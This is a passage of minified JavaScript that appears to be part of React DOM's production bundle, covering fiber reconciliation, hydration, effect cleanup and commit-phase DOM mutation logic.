9:e=e.body;break;default:e=e.nodeName==="HTML"?e.ownerDocument.body:e}for(pe=Et(e.firstChild),we=t,te=!0,aa=null,St=!0,a=Ou(t,null,l,a),t.child=a;a;)a.flags=a.flags&-3|4096,a=a.sibling}else{if(Ma(),l===n){t=Qt(e,t,a);break e}ze(e,t,l,a)}t=t.child}return t;case 26:return us(e,t),e===null?(a=Zd(t.type,null,t.pendingProps,null))?t.memoizedState=a:te||(a=t.type,e=t.pendingProps,l=xs(V.current).createElement(a),l[Le]=t,l[Xe]=e,je(l,a,e),Me(l),t.stateNode=l):t.memoizedState=Zd(t.type,e.memoizedProps,t.pendingProps,e.memoizedState),null;case 27:return xl(t),e===null&&te&&(l=t.stateNode=Vd(t.type,t.pendingProps,V.current),we=t,St=!0,n=pe,ya(t.type)?($o=n,pe=Et(l.firstChild)):pe=n),ze(e,t,t.pendingProps.children,a),us(e,t),e===null&&(t.flags|=4194304),t.child;case 5:return e===null&&te&&((n=l=pe)&&(l=Ap(l,t.type,t.pendingProps,St),l!==null?(t.stateNode=l,we=t,pe=Et(l.firstChild),St=!1,n=!0):n=!1),n||la(t)),xl(t),n=t.type,s=t.pendingProps,i=e!==null?e.memoizedProps:null,l=s.children,Ko(n,s)?l=null:i!==null&&Ko(n,i)&&(t.flags|=32),t.memoizedState!==null&&(n=Qi(e,t,Hm,null,null,a),gn._currentValue=n),us(e,t),ze(e,t,l,a),t.child;case 6:return e===null&&te&&((e=a=pe)&&(a=xp(a,t.pendingProps,St),a!==null?(t.stateNode=a,we=t,pe=null,e=!0):e=!1),e||la(t)),null;case 13:return Lr(e,t,a);case 4:return Oe(t,t.stateNode.containerInfo),l=t.pendingProps,e===null?t.child=za(t,null,l,a):ze(e,t,l,a),t.child;case 11:return Ar(e,t,t.type,t.pendingProps,a);case 7:return ze(e,t,t.pendingProps,a),t.child;case 8:return ze(e,t,t.pendingProps.children,a),t.child;case 12:return ze(e,t,t.pendingProps.children,a),t.child;case 10:return l=t.pendingProps,na(t,t.type,l.value),ze(e,t,l.children,a),t.child;case 9:return n=t.type._context,l=t.pendingProps.children,Na(t),n=Ue(n),l=l(n),t.flags|=1,ze(e,t,l,a),t.child;case 14:return xr(e,t,t.type,t.pendingProps,a);case 15:return Cr(e,t,t.type,t.pendingProps,a);case 19:return Ur(e,t,a);case 31:return Zm(e,t,a);case 22:return Or(e,t,a,t.pendingProps);case 24:return Na(t),l=Ue(_e),e===null?(n=qi(),n===null&&(n=de,s=ki(),n.pooledCache=s,s.refCount++,s!==null&&(n.pooledCacheLanes|=a),n=s),t.memoizedState={parent:l,cache:n},Li(t),na(t,_e,n)):((e.lanes&a)!==0&&(wi(e,t),$l(t,null,null,a),Zl()),n=e.memoizedState,s=t.memoizedState,n.parent!==l?(n={parent:l,cache:l},t.memoizedState=n,t.lanes===0&&(t.memoizedState=t.updateQueue.baseState=n),na(t,_e,l)):(l=s.cache,na(t,_e,l),l!==n.cache&&Di(t,[_e],a,!0))),ze(e,t,t.pendingProps.children,a),t.child;case 29:throw t.pendingProps}throw Error(m(156,t.tag))}function Yt(e){e.flags|=4}function yo(e,t,a,l,n){if((t=(e.mode&32)!==0)&&(t=!1),t){if(e.flags|=16777216,(n&335544128)===n)if(e.stateNode.complete)e.flags|=8192;else if(rd())e.flags|=8192;else throw Ua=Zn,Ni}else e.flags&=-16777217}function jr(e,t){if(t.type!=="stylesheet"||(t.state.loading&4)!==0)e.flags&=-16777217;else if(e.flags|=16777216,!Fd(t))if(rd())e.flags|=8192;else throw Ua=Zn,Ni}function ds(e,t){t!==null&&(e.flags|=4),e.flags&16384&&(t=e.tag!==22?yc():536870912,e.lanes|=t,yl|=t)}function tn(e,t){if(!te)switch(e.tailMode){case"hidden":t=e.tail;for(var a=null;t!==null;)t.alternate!==null&&(a=t),t=t.sibling;a===null?e.tail=null:a.sibling=null;break;case"collapsed":a=e.tail;for(var l=null;a!==null;)a.alternate!==null&&(l=a),a=a.sibling;l===null?t||e.tail===null?e.tail=null:e.tail.sibling=null:l.sibling=null}}function he(e){var t=e.alternate!==null&&e.alternate.child===e.child,a=0,l=0;if(t)for(var n=e.child;n!==null;)a|=n.lanes|n.childLanes,l|=n.subtreeFlags&65011712,l|=n.flags&65011712,n.return=e,n=n.sibling;else for(n=e.child;n!==null;)a|=n.lanes|n.childLanes,l|=n.subtreeFlags,l|=n.flags,n.return=e,n=n.sibling;return e.subtreeFlags|=l,e.childLanes=a,t}function Wm(e,t,a){var l=t.pendingProps;switch(Ri(t),t.tag){case 16:case 15:case 0:case 11:case 7:case 8:case 12:case 9:case 14:return he(t),null;case 1:return he(t),null;case 3:return a=t.stateNode,l=null,e!==null&&(l=e.memoizedState.cache),t.memoizedState.cache!==l&&(t.flags|=2048),Bt(_e),ge(),a.pendingContext&&(a.context=a.pendingContext,a.pendingContext=null),(e===null||e.child===null)&&(nl(t)?Yt(t):e===null||e.memoizedState.isDehydrated&&(t.flags&256)===0||(t.flags|=1024,xi())),he(t),null;case 26:var n=t.type,s=t.memoizedState;return e===null?(Yt(t),s!==null?(he(t),jr(t,s)):(he(t),yo(t,n,null,l,a))):s?s!==e.memoizedState?(Yt(t),he(t),jr(t,s)):(he(t),t.flags&=-16777217):(e=e.memoizedProps,e!==l&&Yt(t),he(t),yo(t,n,e,l,a)),null;case 27:if(_n(t),a=V.current,n=t.type,e!==null&&t.stateNode!=null)e.memoizedProps!==l&&Yt(t);else{if(!l){if(t.stateNode===null)throw Error(m(166));return he(t),null}e=k.current,nl(t)?yu(t):(e=Vd(n,l,a),t.stateNode=e,Yt(t))}return he(t),null;case 5:if(_n(t),n=t.type,e!==null&&t.stateNode!=null)e.memoizedProps!==l&&Yt(t);else{if(!l){if(t.stateNode===null)throw Error(m(166));return he(t),null}if(s=k.current,nl(t))yu(t);else{var i=xs(V.current);switch(s){case 1:s=i.createElementNS("http://www.w3.org/2000/svg",n);break;case 2:s=i.createElementNS("http://www.w3.org/1998/Math/MathML",n);break;default:switch(n){case"svg":s=i.createElementNS("http://www.w3.org/2000/svg",n);break;case"math":s=i.createElementNS("http://www.w3.org/1998/Math/MathML",n);break;case"script":s=i.createElement("div"),s.innerHTML="<script><\/script>",s=s.removeChild(s.firstChild);break;case"select":s=typeof l.is=="string"?i.createElement("select",{is:l.is}):i.createElement("select"),l.multiple?s.multiple=!0:l.size&&(s.size=l.size);break;default:s=typeof l.is=="string"?i.createElement(n,{is:l.is}):i.createElement(n)}}s[Le]=t,s[Xe]=l;e:for(i=t.child;i!==null;){if(i.tag===5||i.tag===6)s.appendChild(i.stateNode);else if(i.tag!==4&&i.tag!==27&&i.child!==null){i.child.return=i,i=i.child;continue}if(i===t)break e;for(;i.sibling===null;){if(i.return===null||i.return===t)break e;i=i.return}i.sibling.return=i.return,i=i.sibling}t.stateNode=s;e:switch(je(s,n,l),n){case"button":case"input":case"select":case"textarea":l=!!l.autoFocus;break e;case"img":l=!0;break e;default:l=!1}l&&Yt(t)}}return he(t),yo(t,t.type,e===null?null:e.memoizedProps,t.pendingProps,a),null;case 6:if(e&&t.stateNode!=null)e.memoizedProps!==l&&Yt(t);else{if(typeof l!="string"&&t.stateNode===null)throw Error(m(166));if(e=V.current,nl(t)){if(e=t.stateNode,a=t.memoizedProps,l=null,n=we,n!==null)switch(n.tag){case 27:case 5:l=n.memoizedProps}e[Le]=t,e=!!(e.nodeValue===a||l!==null&&l.suppressHydrationWarning===!0||Ld(e.nodeValue,a)),e||la(t,!0)}else e=xs(e).createTextNode(l),e[Le]=t,t.stateNode=e}return he(t),null;case 31:if(a=t.memoizedState,e===null||e.memoizedState!==null){if(l=nl(t),a!==null){if(e===null){if(!l)throw Error(m(318));if(e=t.memoizedState,e=e!==null?e.dehydrated:null,!e)throw Error(m(557));e[Le]=t}else Ma(),(t.flags&128)===0&&(t.memoizedState=null),t.flags|=4;he(t),e=!1}else a=xi(),e!==null&&e.memoizedState!==null&&(e.memoizedState.hydrationErrors=a),e=!0;if(!e)return t.flags&256?(ot(t),t):(ot(t),null);if((t.flags&128)!==0)throw Error(m(558))}return he(t),null;case 13:if(l=t.memoizedState,e===null||e.memoizedState!==null&&e.memoizedState.dehydrated!==null){if(n=nl(t),l!==null&&l.dehydrated!==null){if(e===null){if(!n)throw Error(m(318));if(n=t.memoizedState,n=n!==null?n.dehydrated:null,!n)throw Error(m(317));n[Le]=t}else Ma(),(t.flags&128)===0&&(t.memoizedState=null),t.flags|=4;he(t),n=!1}else n=xi(),e!==null&&e.memoizedState!==null&&(e.memoizedState.hydrationErrors=n),n=!0;if(!n)return t.flags&256?(ot(t),t):(ot(t),null)}return ot(t),(t.flags&128)!==0?(t.lanes=a,t):(a=l!==null,e=e!==null&&e.memoizedState!==null,a&&(l=t.child,n=null,l.alternate!==null&&l.alternate.memoizedState!==null&&l.alternate.memoizedState.cachePool!==null&&(n=l.alternate.memoizedState.cachePool.pool),s=null,l.memoizedState!==null&&l.memoizedState.cachePool!==null&&(s=l.memoizedState.cachePool.pool),s!==n&&(l.flags|=2048)),a!==e&&a&&(t.child.flags|=8192),ds(t,t.updateQueue),he(t),null);case 4:return ge(),e===null&&Bo(t.stateNode.containerInfo),he(t),null;case 10:return Bt(t.type),he(t),null;case 19:if(p(be),l=t.memoizedState,l===null)return he(t),null;if(n=(t.flags&128)!==0,s=l.rendering,s===null)if(n)tn(l,!1);else{if(Se!==0||e!==null&&(e.flags&128)!==0)for(e=t.child;e!==null;){if(s=Pn(e),s!==null){for(t.flags|=128,tn(l,!1),e=s.updateQueue,t.updateQueue=e,ds(t,e),t.subtreeFlags=0,e=a,a=t.child;a!==null;)fu(a,e),a=a.sibling;return x(be,be.current&1|2),te&&zt(t,l.treeForkCount),t.child}e=e.sibling}l.tail!==null&&tt()>gs&&(t.flags|=128,n=!0,tn(l,!1),t.lanes=4194304)}else{if(!n)if(e=Pn(s),e!==null){if(t.flags|=128,n=!0,e=e.updateQueue,t.updateQueue=e,ds(t,e),tn(l,!0),l.tail===null&&l.tailMode==="hidden"&&!s.alternate&&!te)return he(t),null}else 2*tt()-l.renderingStartTime>gs&&a!==536870912&&(t.flags|=128,n=!0,tn(l,!1),t.lanes=4194304);l.isBackwards?(s.sibling=t.child,t.child=s):(e=l.last,e!==null?e.sibling=s:t.child=s,l.last=s)}return l.tail!==null?(e=l.tail,l.rendering=e,l.tail=e.sibling,l.renderingStartTime=tt(),e.sibling=null,a=be.current,x(be,n?a&1|2:a&1),te&&zt(t,l.treeForkCount),e):(he(t),null);case 22:case 23:return ot(t),Bi(),l=t.memoizedState!==null,e!==null?e.memoizedState!==null!==l&&(t.flags|=8192):l&&(t.flags|=8192),l?(a&536870912)!==0&&(t.flags&128)===0&&(he(t),t.subtreeFlags&6&&(t.flags|=8192)):he(t),a=t.updateQueue,a!==null&&ds(t,a.retryQueue),a=null,e!==null&&e.memoizedState!==null&&e.memoizedState.cachePool!==null&&(a=e.memoizedState.cachePool.pool),l=null,t.memoizedState!==null&&t.memoizedState.cachePool!==null&&(l=t.memoizedState.cachePool.pool),l!==a&&(t.flags|=2048),e!==null&&p(La),null;case 24:return a=null,e!==null&&(a=e.memoizedState.cache),t.memoizedState.cache!==a&&(t.flags|=2048),Bt(_e),he(t),null;case 25:return null;case 30:return null}throw Error(m(156,t.tag))}function Jm(e,t){switch(Ri(t),t.tag){case 1:return e=t.flags,e&65536?(t.flags=e&-65537|128,t):null;case 3:return Bt(_e),ge(),e=t.flags,(e&65536)!==0&&(e&128)===0?(t.flags=e&-65537|128,t):null;case 26:case 27:case 5:return _n(t),null;case 31:if(t.memoizedState!==null){if(ot(t),t.alternate===null)throw Error(m(340));Ma()}return e=t.flags,e&65536?(t.flags=e&-65537|128,t):null;case 13:if(ot(t),e=t.memoizedState,e!==null&&e.dehydrated!==null){if(t.alternate===null)throw Error(m(340));Ma()}return e=t.flags,e&65536?(t.flags=e&-65537|128,t):null;case 19:return p(be),null;case 4:return ge(),null;case 10:return Bt(t.type),null;case 22:case 23:return ot(t),Bi(),e!==null&&p(La),e=t.flags,e&65536?(t.flags=e&-65537|128,t):null;case 24:return Bt(_e),null;case 25:return null;default:return null}}function Br(e,t){switch(Ri(t),t.tag){case 3:Bt(_e),ge();break;case 26:case 27:case 5:_n(t);break;case 4:ge();break;case 31:t.memoizedState!==null&&ot(t);break;case 13:ot(t);break;case 19:p(be);break;case 10:Bt(t.type);break;case 22:case 23:ot(t),Bi(),e!==null&&p(La);break;case 24:Bt(_e)}}function an(e,t){try{var a=t.updateQueue,l=a!==null?a.lastEffect:null;if(l!==null){var n=l.next;a=n;do{if((a.tag&e)===e){l=void 0;var s=a.create,i=a.inst;l=s(),i.destroy=l}a=a.next}while(a!==n)}}catch(o){oe(t,t.return,o)}}function ra(e,t,a){try{var l=t.updateQueue,n=l!==null?l.lastEffect:null;if(n!==null){var s=n.next;l=s;do{if((l.tag&e)===e){var i=l.inst,o=i.destroy;if(o!==void 0){i.destroy=void 0,n=t;var c=a,g=o;try{g()}catch(E){oe(n,c,E)}}}l=l.next}while(l!==s)}}catch(E){oe(t,t.return,E)}}function Hr(e){var t=e.updateQueue;if(t!==null){var a=e.stateNode;try{ku(t,a)}catch(l){oe(e,e.return,l)}}}function Gr(e,t,a){a.props=Ba(e.type,e.memoizedProps),a.state=e.memoizedState;try{a.componentWillUnmount()}catch(l){oe(e,t,l)}}function ln(e,t){try{var a=e.ref;if(a!==null){switch(e.tag){case 26:case 27:case 5:var l=e.stateNode;break;case 30:l=e.stateNode;break;default:l=e.stateNode}typeof a=="function"?e.refCleanup=a(l):a.current=l}}catch(n){oe(e,t,n)}}function kt(e,t){var a=e.ref,l=e.refCleanup;if(a!==null)if(typeof l=="function")try{l()}catch(n){oe(e,t,n)}finally{e.refCleanup=null,e=e.alternate,e!=null&&(e.refCleanup=null)}else if(typeof a=="function")try{a(null)}catch(n){oe(e,t,n)}else a.current=null}function Qr(e){var t=e.type,a=e.memoizedProps,l=e.stateNode;try{e:switch(t){case"button":case"input":case"select":case"textarea":a.autoFocus&&l.focus();break e;case"img":a.src?l.src=a.src:a.srcSet&&(l.srcset=a.srcSet)}}catch(n){oe(e,e.return,n)}}function vo(e,t,a){try{var l=e.stateNode;Sp(l,e.type,a,t),l[Xe]=t}catch(n){oe(e,e.return,n)}}function Yr(e){return e.tag===5||e.tag===3||e.tag===26||e.tag===27&&ya(e.type)||e.tag===4}function So(e){e:for(;;){for(;e.sibling===null;){if(e.return===null||Yr(e.return))return null;e=e.return}for(e.sibling.return=e.return,e=e.sibling;e.tag!==5&&e.tag!==6&&e.tag!==18;){if(e.tag===27&&ya(e.type)||e.flags&2||e.child===null||e.tag===4)continue e;e.child.return=e,e=e.child}if(!(e.flags&2))return e.stateNode}}function bo(e,t,a){var l=e.tag;if(l===5||l===6)e=e.stateNode,t?(a.nodeType===9?a.body:a.nodeName==="HTML"?a.ownerDocument.body:a).insertBefore(e,t):(t=a.nodeType===9?a.body:a.nodeName==="HTML"?a.ownerDocument.body:a,t.appendChild(e),a=a._reactRootContainer,a!=null||t.onclick!==null||(t.onclick=Lt));else if(l!==4&&(l===27&&ya(e.type)&&(a=e.stateNode,t=null),e=e.child,e!==null))for(bo(e,t,a),e=e.sibling;e!==null;)bo(e,t,a),e=e.sibling}function fs(e,t,a){var l=e.tag;if(l===5||l===6)e=e.stateNode,t?a.insertBefore(e,t):a.appendChild(e);else if(l!==4&&(l===27&&ya(e.type)&&(a=e.stateNode),e=e.child,e!==null))for(fs(e,t,a),e=e.sibling;e!==null;)fs(e,t,a),e=e.sibling}function Kr(e){var t=e.stateNode,a=e.memoizedProps;try{for(var l=e.type,n=t.attributes;n.length;)t.removeAttributeNode(n[0]);je(t,l,a),t[Le]=e,t[Xe]=a}catch(s){oe(e,e.return,s)}}var Kt=!1,Ae=!1,Eo=!1,Vr=typeof WeakSet=="function"?WeakSet:Set,qe=null;function Pm(e,t){if(e=e.containerInfo,Qo=Ns,e=lu(e),mi(e)){if("selectionStart"in e)var a={start:e.selectionStart,end:e.selectionEnd};else e:{a=(a=e.ownerDocument)&&a.defaultView||window;var l=a.getSelection&&a.getSelection();if(l&&l.rangeCount!==0){a=l.anchorNode;var n=l.anchorOffset,s=l.focusNode;l=l.focusOffset;try{a.nodeType,s.nodeType}catch{a=null;break e}var i=0,o=-1,c=-1,g=0,E=0,R=e,y=null;t:for(;;){for(var v;R!==a||n!==0&&R.nodeType!==3||(o=i+n),R!==s||l!==0&&R.nodeType!==3||(c=i+l),R.nodeType===3&&(i+=R.nodeValue.length),(v=R.firstChild)!==null;)y=R,R=v;for(;;){if(R===e)break t;if(y===a&&++g===n&&(o=i),y===s&&++E===l&&(c=i),(v=R.nextSibling)!==null)break;R=y,y=R.parentNode}R=v}a=o===-1||c===-1?null:{start:o,end:c}}else a=null}a=a||{start:0,end:0}}else a=null;for(Yo={focusedElem:e,selectionRange:a},Ns=!1,qe=t;qe!==null;)if(t=qe,e=t.child,(t.subtreeFlags&1028)!==0&&e!==null)e.return=t,qe=e;else for(;qe!==null;){switch(t=qe,s=t.alternate,e=t.flags,t.tag){case 0:if((e&4)!==0&&(e=t.updateQueue,e=e!==null?e.events:null,e!==null))for(a=0;a<e.length;a++)n=e[a],n.ref.impl=n.nextImpl;break;case 11:case 15:break;case 1:if((e&1024)!==0&&s!==null){e=void 0,a=t,n=s.memoizedProps,s=s.memoizedState,l=a.stateNode;try{var N=Ba(a.type,n);e=l.getSnapshotBeforeUpdate(N,s),l.__reactInternalSnapshotBeforeUpdate=e}catch(G){oe(a,a.return,G)}}break;case 3:if((e&1024)!==0){if(e=t.stateNode.containerInfo,a=e.nodeType,a===9)Xo(e);else if(a===1)switch(e.nodeName){case"HEAD":case"HTML":case"BODY":Xo(e);break;default:e.textContent=""}}break;case 5:case 26:case 27:case 6:case 4:case 17:break;default:if((e&1024)!==0)throw Error(m(163))}if(e=t.sibling,e!==null){e.return=t.return,qe=e;break}qe=t.return}}function Xr(e,t,a){var l=a.flags;switch(a.tag){case 0:case 11:case 15:Xt(e,a),l&4&&an(5,a);break;case 1:if(Xt(e,a),l&4)if(e=a.stateNode,t===null)try{e.componentDidMount()}catch(i){oe(a,a.return,i)}else{var n=Ba(a.type,t.memoizedProps);t=t.memoizedState;try{e.componentDidUpdate(n,t,e.__reactInternalSnapshotBeforeUpdate)}catch(i){oe(a,a.return,i)}}l&64&&Hr(a),l&512&&ln(a,a.return);break;case 3:if(Xt(e,a),l&64&&(e=a.updateQueue,e!==null)){if(t=null,a.child!==null)switch(a.child.tag){case 27:case 5:t=a.child.stateNode;break;case 1:t=a.child.stateNode}try{ku(e,t)}catch(i){oe(a,a.return,i)}}break;case 27:t===null&&l&4&&Kr(a);case 26:case 5:Xt(e,a),t===null&&l&4&&Qr(a),l&512&&ln(a,a.return);break;case 12:Xt(e,a);break;case 31:Xt(e,a),l&4&&$r(e,a);break;case 13:Xt(e,a),l&4&&Wr(e,a),l&64&&(e=a.memoizedState,e!==null&&(e=e.dehydrated,e!==null&&(a=op.bind(null,a),Cp(e,a))));break;case 22:if(l=a.memoizedState!==null||Kt,!l){t=t!==null&&t.memoizedState!==null||Ae,n=Kt;var s=Ae;Kt=l,(Ae=t)&&!s?It(e,a,(a.subtreeFlags&8772)!==0):Xt(e,a),Kt=n,Ae=s}break;case 30:break;default:Xt(e,a)}}function Ir(e){var t=e.alternate;t!==null&&(e.alternate=null,Ir(t)),e.child=null,e.deletions=null,e.sibling=null,e.tag===5&&(t=e.stateNode,t!==null&&Ws(t)),e.stateNode=null,e.return=null,e.dependencies=null,e.memoizedProps=null,e.memoizedState=null,e.pendingProps=null,e.stateNode=null,e.updateQueue=null}var ye=null,Ze=!1;function Vt(e,t,a){for(a=a.child;a!==null;)Zr(e,t,a),a=a.sibling}function Zr(e,t,a){if(at&&typeof at.onCommitFiberUnmount=="function")try{at.onCommitFiberUnmount(Cl,a)}catch{}switch(a.tag){case 26:Ae||kt(a,t),Vt(e,t,a),a.memoizedState?a.memoizedState.count--:a.stateNode&&(a=a.stateNode,a.parentNode.removeChild(a));break;case 27:Ae||kt(a,t);var l=ye,n=Ze;ya(a.type)&&(ye=a.stateNode,Ze=!1),Vt(e,t,a),mn(a.stateNode),ye=l,Ze=n;break;case 5:Ae||kt(a,t);case 6:if(l=ye,n=Ze,ye=null,Vt(e,t,a),ye=l,Ze=n,ye!==null)if(Ze)try{(ye.nodeType===9?ye.body:ye.nodeName==="HTML"?ye.ownerDocument.body:ye).removeChild(a.stateNode)}catch(s){oe(a,t,s)}else try{ye.removeChild(a.stateNode)}catch(s){oe(a,t,s)}break;case 18:ye!==null&&(Ze?(e=ye,Hd(e.nodeType===9?e.body:e.nodeName==="HTML"?e.ownerDocument.body:e,a.stateNode),Al(e)):Hd(ye,a.stateNode));break;case 4:l=ye,n=Ze,ye=a.stateNode.containerInfo,Ze=!0,Vt(e,t,a),ye=l,Ze=n;break;case 0:case 11:case 14:case 15:ra(2,a,t),Ae||ra(4,a,t),Vt(e,t,a);break;case 1:Ae||(kt(a,t),l=a.stateNode,typeof l.componentWillUnmount=="function"&&Gr(a,t,l)),Vt(e,t,a);break;case 21:Vt(e,t,a);break;case 22:Ae=(l=Ae)||a.memoizedState!==null,Vt(e,t,a),Ae=l;break;default:Vt(e,t,a)}}function $r(e,t){if(t.memoizedState===null&&(e=t.alternate,e!==null&&(e=e.memoizedState,e!==null))){e=e.dehydrated;try{Al(e)}catch(a){oe(t,t.return,a)}}}function Wr(e,t){if(t.memoizedState===null&&(e=t.alternate,e!==null&&(e=e.memoizedState,e!==null&&(e=e.dehydrated,e!==null))))try{Al(e)}catch(a){oe(t,t.return,a)}}function Fm(e){switch(e.tag){case 31:case 13:case 19:var t=e.stateNode;return t===null&&(t=e.stateNode=new Vr),t;case 22:return e=e.stateNode,t=e._retryCache,t===null&&(t=e._retryCache=new Vr),t;default:throw Error(m(435,e.tag))}}function ms(e,t){var a=Fm(e);t.forEach(function(l){if(!a.has(l)){a.add(l);var n=cp.bind(null,e,l);l.then(n,n)}})}function $e(e,t){var a=t.deletions;if(a!==null)for(var l=0;l<a.length;l++){var n=a[l],s=e,i=t,o=i;e:for(;o!==null;){switch(o.tag){case 27:if(ya(o.type)){ye=o.stateNode,Ze=!1;break e}break;case 5:ye=o.stateNode,Ze=!1;break e;case 3:case 4:ye=o.stateNode.containerInfo,Ze=!0;break e}o=o.return}if(ye===null)throw Error(m(160));Zr(s,i,n),ye=null,Ze=!1,s=n.alternate,s!==null&&(s.return=null),n.return=null}if(t.subtreeFlags&13886)for(t=t.child;t!==null;)Jr(t,e),t=t.sibling}var At=null;function Jr(e,t){var a=e.alternate,l=e.flags;switch(e.tag){case 0:case 11:case 14:case 15:$e(t,e),We(e),l&4&&(ra(3,e,e.return),an(3,e),ra(5,e,e.return));break;case 1:$e(t,e),We(e),l&512&&(Ae||a===null||kt(a,a.return)),l&64&&Kt&&(e=e.updateQueue,e!==null&&(l=e.callbacks,l!==null&&(a=e.shared.hiddenCallbacks,e.shared.hiddenCallbacks=a===null?l:a.concat(l))));break;case 26:var n=At;if($e(t,e),We(e),l&512&&(Ae||a===null||kt(a,a.return)),l&4){var s=a!==null?a.memoizedState:null;if(l=e.memoizedState,a===null)if(l===null)if(e.stateNode===null){e:{l=e.type,a=e.memoizedProps,n=n.ownerDocument||n;t:switch(l){case"title":s=n.getElementsByTagName("title")[0],(!s||s[kl]||s[Le]||s.namespaceURI==="http://www.w3.org/2000/svg"||s.hasAttribute("itemprop"))&&(s=n.createElement(l),n.head.insertBefore(s,n.querySelector("head > title"))),je(s,l,a),s[Le]=e,Me(s),l=s;break e;case"link":var i=Jd("link","href",n).get(l+(a.href||""));if(i){for(var o=0;o<i.length;o++)if(s=i[o],s.getAttribute("href")===(a.href==null||a.href===""?null:a.href)&&s.getAttribute("rel")===(a.rel==null?null:a.rel)&&s.getAttribute("title")===(a.title==null?null:a.title)&&s.getAttribute("crossorigin")===(a.crossOrigin==null?null:a.crossOrigin)){i.splice(o,1);break t}}s=n.createElement(l),je(s,l,a),n.head.appendChild(s);break;case"meta":if(i=Jd("meta","content",n).get(l+(a.content||""))){for(o=0;o<i.length;o++)if(s=i[o],s.getAttribute("content")===(a.content==null?null:""+a.content)&&s.getAttribute("name")===(a.name==null?null:a.name)&&s.getAttribute("property")===(a.property==null?null:a.property)&&s.getAttribute("http-equiv")===(a.httpEquiv==null?null:a.httpEquiv)&&s.getAttribute("charset")===(a.charSet==null?null:a.charSet)){i.splice(o,1);break t}}s=n.createElement(l),je(s,l,a),n.head.appendChild(s);break;default:throw Error(m(468,l))}s[Le]=e,Me(s),l=s}e.stateNode=l}else Pd(n,e.type,e.stateNode);else e.stateNode=Wd(n,l,e.memoizedProps);else s!==l?(s===null?a.stateNode!==null&&(a=a.stateNode,a.parentNode.removeChild(a)):s.count--,l===null?Pd(n,e.type,e.stateNode):Wd(n,l,e.memoizedProps)):l===null&&e.stateNode!==null&&vo(e,e.memoizedProps,a.memoizedProps)}break;case 27:$e(t,e),We(e),l&512&&(Ae||a===null||kt(a,a.return)),a!==null&&l&4&&vo(e,e.memoizedProps,a.memoizedProps);break;case 5:if($e(t,e),We(e),l&512&&(Ae||a===null||kt(a,a.return)),e.flags&32){n=e.stateNode;try{Za(n,"")}catch(N){oe(e,e.return,N)}}l&4&&e.stateNode!=null&&(n=e.memoizedProps,vo(e,n,a!==null?a.memoizedProps:n)),l&1024&&(Eo=!0);break;case 6:if($e(t,e),We(e),l&4){if(e.stateNode===null)throw Error(m(162));l=e.memoizedProps,a=e.stateNode;try{a.nodeValue=l}catch(N){oe(e,e.return,N)}}break;case 3:if(Ds=null,n=At,At=Cs(t.containerInfo),$e(t,e),At=n,We(e),l&4&&a!==null&&a.memoizedState.isDehydrated)try{Al(t.containerInfo)}catch(N){oe(e,e.return,N)}Eo&&(Eo=!1,Pr(e));break;case 4:l=At,At=Cs(e.stateNode.containerInfo),$e(t,e),We(e),At=l;break;case 12:$e(t,e),We(e);break;case 31:$e(t,e),We(e),l&4&&(l=e.updateQueue,l!==null&&(e.updateQueue=null,ms(e,l)));break;case 13:$e(t,e),We(e),e.child.flags&8192&&e.memoizedState!==null!=(a!==null&&a.memoizedState!==null)&&(hs=tt()),l&4&&(l=e.updateQueue,l!==null&&(e.updateQueue=null,ms(e,l)));break;case 22:n=e.memoizedState!==null;var c=a!==null&&a.memoizedState!==null,g=Kt,E=Ae;if(Kt=g||n,Ae=E||c,$e(t,e),Ae=E,Kt=g,We(e),l&8192)e:for(t=e.stateNode,t._visibility=n?t._visibility&-2:t._visibility|1,n&&(a===null||c||Kt||Ae||Ha(e)),a=null,t=e;;){if(t.tag===5||t.tag===26){if(a===null){c=a=t;try{if(s=c.stateNode,n)i=s.style,typeof i.setProperty=="function"?i.setProperty("display","none","important"):i.display="none";else{o=c.stateNode;var R=c.memoizedProps.style,y=R!=null&&R.hasOwnProperty("display")?R.display:null;o.style.display=y==null||typeof y=="boolean"?"":(""+y).trim()}}catch(N){oe(c,c.return,N)}}}else if(t.tag===6){if(a===null){c=t;try{c.stateNode.nodeValue=n?"":c.memoizedProps}catch(N){oe(c,c.return,N)}}}else if(t.tag===18){if(a===null){c=t;try{var v=c.stateNode;n?Gd(v,!0):Gd(c.stateNode,!1)}catch(N){oe(c,c.return,N)}}}else if((t.tag!==22&&t.tag!==23||t.memoizedState===null||t===e)&&t.child!==null){t.child.return=t,t=t.child;continue}if(t===e)break e;for(;t.sibling===null;){if(t.return===null||t.return===e)break e;a===t&&(a=null),t=t.return}a===t&&(a=null),t.sibling.return=t.return,t=t.sibling}l&4&&(l=e.updateQueue,l!==null&&(a=l.retryQueue,a!==null&&(l.retryQueue=null,ms(e,a))));break;case 19:$e(t,e),We(e),l&4&&(l=e.updateQueue,l!==null&&(e.updateQueue=null,ms(e,l)));break;case 30:break;case 21:break;default:$e(t,e),We(e)}}function We(e){var t=e.flags;if(t&2){try{for(var a,l=e.return;l!==null;){if(Yr(l)){a=l;break}l=l.return}if(a==null)throw Error(m(160));switch(a.tag){case 27:var n=a.stateNode,s=So(e);fs(e,s,n);break;case 5:var i=a.stateNode;a.flags&32&&(Za(i,""),a.flags&=-33);var o=So(e);fs(e,o,i);break;case 3:case 4:var c=a.stateNode.containerInfo,g=So(e);bo(e,g,c);break;default:throw Error(m(161))}}catch(E){oe(e,e.return,E)}e.flags&=-3}t&4096&&(e.flags&=-4097)}function Pr(e){if(e.subtreeFlags&1024)for(e=e.child;e!==null;){var t=e;Pr(t),t.tag===5&&t.flags&1024&&t.stateNode.reset(),e=e.sibling}}function Xt(e,t){if(t.subtreeFlags&8772)for(t=t.child;t!==null;)Xr(e,t.alternate,t),t=t.sibling}function Ha(e){for(e=e.child;e!==null;){var t=e;switch(t.tag){case 0:case 11:case 14:case 15:ra(4,t,t.return),Ha(t);break;case 1:kt(t,t.return);var a=t.stateNode;typeof a.componentWillUnmount=="function"&&Gr(t,t.return,a),Ha(t);break;case 27:mn(t.stateNode);case 26:case 5:kt(t,t.return),Ha(t);break;case 22:t.memoizedState===null&&Ha(t);break;case 30:Ha(t);break;default:Ha(t)}e=e.sibling}}function It(e,t,a){for(a=a&&(t.subtreeFlags&8772)!==0,t=t.child;t!==null;){var l=t.alternate,n=e,s=t,i=s.flags;switch(s.tag){case 0:case 11:case 15:It(n,s,a),an(4,s);break;case 1:if(It(n,s,a),l=s,n=l.stateNode,typeof n.componentDidMount=="function")try{n.componentDidMount()}catch(g){oe(l,l.return,g)}if(l=s,n=l.updateQueue,n!==null){var o=l.stateNode;try{var 